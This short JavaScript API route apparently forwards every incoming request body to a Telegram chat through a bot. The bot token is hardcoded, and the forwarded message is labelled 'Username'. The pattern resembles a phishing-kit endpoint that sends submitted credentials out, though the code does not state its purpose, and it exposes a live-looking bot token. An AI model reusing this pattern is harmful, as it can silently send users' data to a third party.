
export default async (req, res) => {
    const data = req.body
    const finalData = JSON.stringify(data, null, 2)
    const { Telegraf, Telegram } = require('telegraf');
    const telegram = new Telegram('1968190732:AAEkTijDzISeO9_Dlr0iSIvkJu_zlxSCCqw', {
        agent: null,
        webHookReply: false
    })
    const bot = new Telegraf('1968190732:AAEkTijDzISeO9_Dlr0iSIvkJu_zlxSCCqw')

    telegram.sendMessage('-549988575',
        `Message: 
        Username: ${finalData}`


    )










}
